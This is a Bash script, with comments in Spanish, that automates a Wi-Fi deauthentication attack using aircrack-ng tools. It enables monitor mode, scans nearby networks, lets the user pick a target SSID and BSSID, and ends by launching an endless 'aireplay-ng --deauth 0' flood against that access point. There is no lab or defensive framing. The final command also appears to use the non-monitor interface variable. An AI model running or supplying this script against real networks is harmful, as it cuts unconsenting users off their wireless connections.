#!/usr/bin/env bash
set -euo pipefail

echo -e "\n"

# Requisitos
command -v airmon-ng >/dev/null || { echo "airmon-ng no está instalado"; exit 1; }
command -v airodump-ng >/dev/null || { echo "airodump-ng no está instalado"; exit 1; }

TMPDIR="$(mktemp -d)"
cleanup() {
  rm -rf "$TMPDIR"
}
trap cleanup EXIT

# 1) Interfaces Wi-Fi (airmon-ng)
mapfile -t IFACES < <(airmon-ng 2>/dev/null | awk 'NR>2 && $2 ~ /^wlan/ {print $2}' | sort -u)

[ ${#IFACES[@]} -eq 0 ] && { echo "No se encontraron interfaces WIFI"; exit 1; }

echo "Selecciona la interfaz WIFI:"
select IFACE in "${IFACES[@]}" "Salir"; do
  [[ "$IFACE" == "Salir" ]] && exit 0
  [[ -n "${IFACE:-}" ]] && break
done

# 2) Habilitar modo monitor
echo "Habilitando modo monitor en $IFACE..."
airmon-ng start "$IFACE" >/dev/null

# Resolver nombre real en monitor (wlan0mon / mon0)
sleep 1

MON_IFACE="$(iw dev | awk '/Interface/ {iface=$2} /type monitor/ {print iface}')"

# Fallbacks razonables
if [[ -z "${MON_IFACE:-}" ]]; then
  if iw dev | grep -q "^Interface ${IFACE}mon"; then
    MON_IFACE="${IFACE}mon"
  elif iw dev | grep -q "^Interface mon0"; then
    MON_IFACE="mon0"
  else
    echo "No se pudo detectar interfaz en modo monitor"
    iw dev
    exit 1
  fi
fi

echo "Interfaz en monitor: $MON_IFACE"

# 3) Escaneo pasivo con airodump-ng
CSV="$TMPDIR/scan"
timeout 12s airodump-ng --output-format csv -w "$CSV" "$MON_IFACE" >/dev/null 2>&1 || true

# 4) SSIDs únicos
mapfile -t SSIDS < <(
  awk -F',' '
    NR>2 && $14!="" {print $14}
  ' "$CSV-01.csv" | sed 's/^ *//;s/ *$//' | awk '!seen[$0]++'
)

[ ${#SSIDS[@]} -eq 0 ] && { echo "No hay SSIDs disponibles"; exit 1; }

echo "Selecciona la red WIFI (SSID):"
select SSID in "${SSIDS[@]}" "Salir"; do
  [[ "$SSID" == "Salir" ]] && exit 0
  [[ -n "${SSID:-}" ]] && break
done

# 5) BSSIDs para ese SSID
mapfile -t BSSIDS < <(
  awk -F',' -v target="$SSID" '
    NR>2 && $14==target && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ {print $1}
  ' "$CSV-01.csv" | awk '!seen[$0]++'
)

if [ ${#BSSIDS[@]} -eq 0 ]; then
  echo "No encontré BSSID para '$SSID'."
  sed -n '1,20p' "$CSV-01.csv"
  exit 1
fi

echo "Selecciona la MAC (BSSID):"
select BSSID in "${BSSIDS[@]}" "Salir"; do
  [[ "$BSSID" == "Salir" ]] && exit 0
  [[ -n "${BSSID:-}" ]] && break
done

# 6) Comando final
echo
echo "Escaneo completado."
echo "IFACE_MONITOR=$MON_IFACE"
echo "SSID='$SSID'"
echo "BSSID='$BSSID'"
echo -e "\n"
echo "Ejecutando Deauther..."
echo -e "\n"
aireplay-ng --deauth 0 -a $BSSID $IFACE
